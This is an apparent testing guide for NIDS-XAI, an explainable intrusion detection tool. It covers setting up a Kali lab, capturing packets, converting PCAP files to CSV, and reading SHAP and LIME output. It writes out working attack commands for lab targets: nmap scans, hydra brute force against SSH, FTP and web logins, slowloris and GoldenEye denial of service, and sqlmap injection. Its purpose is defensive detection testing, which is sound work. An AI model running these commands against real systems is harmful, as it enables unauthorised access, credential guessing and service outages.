# NIDS-XAI Testing Guide

## Complete Guide for Testing with Kali Linux VM

This document provides step-by-step instructions for testing the NIDS-XAI system with real network attacks simulated using Kali Linux.

---

## Table of Contents

1. [Test Environment Setup](#test-environment-setup)
2. [Network Configuration](#network-configuration)
3. [Attack Simulations](#attack-simulations)
4. [Traffic Capture](#traffic-capture)
5. [PCAP to CSV Conversion](#pcap-to-csv-conversion)
6. [Classification and Analysis](#classification-and-analysis)
7. [Interpreting Results](#interpreting-results)
8. [Troubleshooting](#troubleshooting)

---

## Test Environment Setup

### Required Components

```
+==================+     +==================+     +==================+
|   KALI LINUX     |     |   TARGET VM      |     |   HOST MACHINE   |
|   (Attacker)     |     |   (Victim)       |     |   (NIDS-XAI)     |
+==================+     +==================+     +==================+
|                  |     |                  |     |                  |
| - Attack tools   |     | - Vulnerable     |     | - Python 3.8+    |
| - nmap           |     |   services       |     | - NIDS-XAI       |
| - hydra          |     | - SSH server     |     | - Wireshark      |
| - slowloris      |     | - FTP server     |     |                  |
|                  |     | - Web server     |     |                  |
+==================+     +==================+     +==================+
```

### VM Setup Options

#### Option 1: VirtualBox/VMware Setup

1. **Kali Linux VM**
   - Download: https://www.kali.org/get-kali/#kali-virtual-machines
   - RAM: 2GB minimum, 4GB recommended
   - Storage: 20GB
   - Network: NAT or Host-only

2. **Target VM (Choose one)**
   - **Metasploitable 2** (Recommended for beginners)
     - Download: https://sourceforge.net/projects/metasploitable/
     - Pre-configured with vulnerable services
   - **DVWA** (Damn Vulnerable Web Application)
     - For web attack testing
   - **Ubuntu Server** with services manually configured

#### Option 2: Docker Setup (Advanced)

```bash
# Kali container
docker run -it --name kali kalilinux/kali-rolling

# Vulnerable target
docker run -d --name dvwa vulnerables/web-dvwa
```

### Network Configuration

#### Host-Only Network (Recommended for Testing)

```
+------------------+
|   Host Machine   |
|   192.168.56.1   |
+--------+---------+
         |
    [Virtual Switch]
    Host-Only Network
    192.168.56.0/24
         |
    +----+----+
    |         |
+---+---+ +---+---+
|Kali   | |Target |
|.100   | |.101   |
+-------+ +-------+
```

**VirtualBox Configuration:**
1. File > Host Network Manager
2. Create new network (192.168.56.0/24)
3. Enable DHCP or set static IPs
4. Assign both VMs to this network

**VMware Configuration:**
1. Edit > Virtual Network Editor
2. Add Host-only network
3. Configure subnet (e.g., 192.168.56.0)
4. Assign VMs to this network

---

## Attack Simulations

### 1. Port Scan (nmap)

**Difficulty**: Very Easy
**Expected Detection Rate**: >95%

```bash
# Basic SYN scan
nmap -sS -p 1-1000 192.168.56.101

# Full port scan with service detection
nmap -sS -sV -p- 192.168.56.101

# Aggressive scan (more detectable)
nmap -A 192.168.56.101

# Slow scan (harder to detect)
nmap -sS -T1 192.168.56.101
```

**Expected Traffic Patterns:**
- Many SYN packets
- Short flow durations
- High RST count (closed ports)
- Low packet sizes

### 2. SSH Brute Force (hydra)

**Difficulty**: Easy
**Expected Detection Rate**: >90%

```bash
# Basic SSH brute force
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.101

# With specific user list
hydra -L users.txt -P passwords.txt ssh://192.168.56.101

# Limit attempts to avoid lockout
hydra -l admin -P passwords.txt -t 4 ssh://192.168.56.101
```

**Expected Traffic Patterns:**
- Destination port 22
- Multiple short connections
- Repeated authentication attempts
- High ACK flag count

### 3. FTP Brute Force (hydra)

**Difficulty**: Easy
**Expected Detection Rate**: >90%

```bash
# FTP brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://192.168.56.101

# Anonymous FTP check first
nmap --script ftp-anon 192.168.56.101
```

**Expected Traffic Patterns:**
- Destination port 21
- Multiple authentication attempts
- Short flow durations

### 4. DoS Slowloris

**Difficulty**: Easy
**Expected Detection Rate**: >85%

```bash
# Install slowloris
apt install slowloris

# Run attack
slowloris 192.168.56.101 -p 80 -s 500

# Or use the Python script
git clone https://github.com/gkbrk/slowloris.git
python3 slowloris.py 192.168.56.101 -p 80 -s 500
```

**Expected Traffic Patterns:**
- Very long flow durations
- Very low bytes per second
- High inter-arrival times
- Many partial HTTP requests

### 5. DoS GoldenEye

**Difficulty**: Easy
**Expected Detection Rate**: >85%

```bash
# Clone GoldenEye
git clone https://github.com/jseidl/GoldenEye.git

# Run attack
python3 goldeneye.py http://192.168.56.101/ -w 50 -s 500
```

**Expected Traffic Patterns:**
- High packets per second
- HTTP/HTTPS traffic (port 80/443)
- Random user agents
- High request rate

### 6. SQL Injection (sqlmap)

**Difficulty**: Medium
**Expected Detection Rate**: >75%

```bash
# Basic SQL injection test
sqlmap -u "http://192.168.56.101/login.php?id=1" --dbs

# With forms
sqlmap -u "http://192.168.56.101/login.php" --forms --dbs

# More aggressive
sqlmap -u "http://192.168.56.101/page.php?id=1" --level=5 --risk=3
```

**Prerequisites:**
- Target must have vulnerable web application
- DVWA or similar with SQL injection vulnerability

### 7. Web Brute Force

**Difficulty**: Medium
**Expected Detection Rate**: >80%

```bash
# HTTP form brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  192.168.56.101 http-post-form \
  "/login.php:user=^USER^&pass=^PASS^:Login failed"

# HTTP Basic Auth
hydra -l admin -P passwords.txt 192.168.56.101 http-get /admin/
```

---

## Traffic Capture

### Method 1: tcpdump (Linux)

```bash
# Capture all traffic
sudo tcpdump -i eth0 -w capture.pcap

# Capture specific host
sudo tcpdump -i eth0 host 192.168.56.101 -w attack.pcap

# Capture specific port
sudo tcpdump -i eth0 port 22 -w ssh_traffic.pcap

# Capture with packet limit
sudo tcpdump -i eth0 -c 10000 -w limited.pcap

# Stop with Ctrl+C
```

### Method 2: Wireshark (Windows/Linux)

1. Start Wireshark
2. Select the appropriate interface (VirtualBox Host-Only)
3. Start capture
4. Run the attack
5. Stop capture
6. File > Save As > capture.pcap

### Method 3: On the Target VM

```bash
# Capture on the target (sees incoming attacks)
sudo tcpdump -i eth0 -w /tmp/attack.pcap

# Transfer to host
scp user@target:/tmp/attack.pcap .
```

### Capture Best Practices

1. **Start capture BEFORE the attack**
2. **Include some normal traffic** for comparison
3. **Capture for sufficient duration** (at least 1-2 minutes)
4. **Label your captures clearly** (attack_type_date.pcap)

---

## PCAP to CSV Conversion

### Using the NIDS-XAI Converter

```bash
cd nids_xai_projectv2/nids_xai

# Basic conversion
python -m tools.pcap_to_csv --input capture.pcap --output capture.csv

# With label (for training/evaluation)
python -m tools.pcap_to_csv --input portscan.pcap --output portscan.csv --label Attack

# Benign traffic
python -m tools.pcap_to_csv --input normal.pcap --output normal.csv --label BENIGN

# With custom timeout
python -m tools.pcap_to_csv --input capture.pcap --output output.csv --timeout 60
```

### Conversion Output

The converter extracts network flows and calculates 78 features:

```
============================================================
CONVERSION SUMMARY
============================================================
  Total flows: 1,234
  Features: 78

  Top Destination Ports:
    Port    22:    456 (36.9%)
    Port    80:    312 (25.3%)
    Port   443:    189 (15.3%)

  Flow Duration (seconds):
    Min:  0.0001
    Max:  45.2341
    Mean: 2.3456

  Packets per Flow:
    Min:  1
    Max:  2345
    Mean: 23.4
============================================================
```

---

## Classification and Analysis

### Step 1: Start NIDS-XAI

```bash
cd nids_xai_projectv2/nids_xai
python main.py
```

### Step 2: Load Model (if not loaded)

Select option 2 or 3 from menu to load data/model.

### Step 3: Classify New Data

Select option 6: "Classify New CSV File"

```
Enter CSV file path: portscan.csv

================================================================================
  Classifying New Data
================================================================================
  Loading: portscan.csv
  Loaded 1,234 samples
  Preprocessing...
  Classifying...

>> Classification Results
----------------------------------------

  Benign (Normal):      123 ( 9.9%)
  Attack:             1,111 (90.1%) ████████████████████████████

  Total:              1,234
  Average Confidence: 94.2%

  WARNING: 1,111 potential attacks detected!
```

### Step 4: View XAI Explanations

The system automatically explains detected attacks:

```
======================================================================
                      PREDICTION EXPLANATION
======================================================================

  DECISION: This network traffic is MALICIOUS (ATTACK)
  CONFIDENCE: 96.3%

----------------------------------------------------------------------
  SHAP EXPLANATION (Time: 0.045s)
----------------------------------------------------------------------

  Features pushing toward ATTACK:
      - SYN Flag Count              = 45         (SHAP: +0.1523)
      - Flow Duration               = 0.001      (SHAP: +0.0892)
      - RST Flag Count              = 38         (SHAP: +0.0654)

  SHAP Summary (Plain English):
  The model flagged this as an ATTACK because:
    1. High number of SYN flags (45) suggests a port scan pattern.
    2. Very short connection duration (0.001s) is typical of scanning.
    3. Multiple connection resets (38) suggest port scanning.

----------------------------------------------------------------------
  LIME EXPLANATION (Time: 0.234s)
----------------------------------------------------------------------

  Rules indicating ATTACK:
      - Flow Duration <= 0.01                    (weight: +0.234)
      - SYN Flag Count > 10                      (weight: +0.156)
      - Total Fwd Packets <= 3                   (weight: +0.089)

======================================================================
```

---

## Interpreting Results

### Detection Metrics

| Metric | Good | Acceptable | Poor |
|--------|------|------------|------|
| Attack Detection Rate | >90% | 70-90% | <70% |
| Confidence | >85% | 70-85% | <70% |
| False Positive Rate | <5% | 5-15% | >15% |

### Expected Results by Attack Type

| Attack | Detection Rate | Key Indicators |
|--------|---------------|----------------|
| Port Scan | 95%+ | SYN flags, short duration |
| SSH Brute Force | 90%+ | Port 22, repeated connections |
| FTP Brute Force | 90%+ | Port 21, auth attempts |
| DoS Slowloris | 85%+ | Long duration, low bandwidth |
| DoS GoldenEye | 85%+ | High packet rate |
| SQL Injection | 75%+ | HTTP patterns |
| Web Brute Force | 80%+ | HTTP auth patterns |

### Understanding XAI Output

**SHAP Values:**
- **Positive** = Feature pushes toward "Attack" classification
- **Negative** = Feature pushes toward "Benign" classification
- **Magnitude** = How strongly the feature influences the decision

**LIME Rules:**
- Shows threshold conditions that triggered the decision
- Easier to explain to non-technical stakeholders
- "When X is above/below Y, it indicates attack behavior"

---

## Test Scenarios

### Scenario 1: Port Scan Detection Test

```bash
# 1. Start capture on target or monitoring machine
sudo tcpdump -i eth0 -w portscan_test.pcap &

# 2. Generate normal traffic (30 seconds)
curl http://target/
sleep 30

# 3. Run port scan from Kali
nmap -sS -p 1-1000 192.168.56.101

# 4. Wait and stop capture
sleep 30
sudo killall tcpdump

# 5. Convert and classify
python -m tools.pcap_to_csv -i portscan_test.pcap -o portscan_test.csv
python main.py  # Use option 6
```

**Expected Result:**
- Detection rate: >95%
- High SYN flag count in explanations
- Short flow durations highlighted

### Scenario 2: Brute Force Detection Test

```bash
# 1. Start capture
sudo tcpdump -i eth0 port 22 -w ssh_brute.pcap &

# 2. Run SSH brute force (limit to 50 attempts)
hydra -l root -P small_wordlist.txt -t 4 -f ssh://target

# 3. Stop capture
sudo killall tcpdump

# 4. Convert and classify
python -m tools.pcap_to_csv -i ssh_brute.pcap -o ssh_brute.csv --label Attack
```

### Scenario 3: DoS Detection Test

```bash
# 1. Start capture
sudo tcpdump -i eth0 port 80 -w dos_test.pcap &

# 2. Run Slowloris for 60 seconds
timeout 60 slowloris target -p 80 -s 200

# 3. Stop capture
sudo killall tcpdump

# 4. Convert and classify
python -m tools.pcap_to_csv -i dos_test.pcap -o dos_test.csv
```

---

## Batch Testing

### Using the Test Runner

```python
from tools.test_helpers import TestRunner, list_attack_scenarios

# List available scenarios
list_attack_scenarios()

# Run batch tests
runner = TestRunner(model, preprocessor, explainer)
results = runner.run_batch_test(
    filepaths=['portscan.csv', 'brute_force.csv', 'dos.csv'],
    expected_labels=['Attack', 'Attack', 'Attack'],
    scenarios=['port_scan', 'ssh_brute_force', 'dos_slowloris']
)

# Save report
runner.generate_html_report(results)
```

---

## Troubleshooting

### Issue: No flows extracted from PCAP

**Possible Causes:**
- PCAP file is empty or corrupted
- Wrong interface captured
- Traffic not going through capture point

**Solutions:**
```bash
# Verify PCAP has packets
tcpdump -r capture.pcap | head

# Check packet count
tcpdump -r capture.pcap | wc -l
```

### Issue: All traffic classified as Benign

**Possible Causes:**
- Attack traffic not captured correctly
- Features don't match training data
- Model not loaded properly

**Solutions:**
1. Verify attack was actually performed
2. Check if PCAP contains attack traffic
3. Reload model and preprocessor

### Issue: Very low confidence scores

**Possible Causes:**
- Traffic patterns differ from training data
- Feature extraction issues
- Insufficient attack duration

**Solutions:**
1. Run attack for longer duration
2. Verify feature extraction output
3. Check for missing features in CSV

### Issue: PCAP conversion fails

**Possible Causes:**
- Scapy not installed
- Npcap not installed (Windows)
- Permission issues

**Solutions:**
```bash
# Install scapy
pip install scapy

# Windows: Install Npcap from https://nmap.org/npcap/

# Linux: Run with sudo if needed
sudo python -m tools.pcap_to_csv ...
```

---

## Safety Notes

1. **Only test on YOUR OWN networks and systems**
2. **Never attack production systems or networks you don't own**
3. **Use isolated virtual networks for testing**
4. **Document all testing activities**
5. **Understand your local laws regarding security testing**

---

*Document Version: 1.0*
*Last Updated: January 2026*
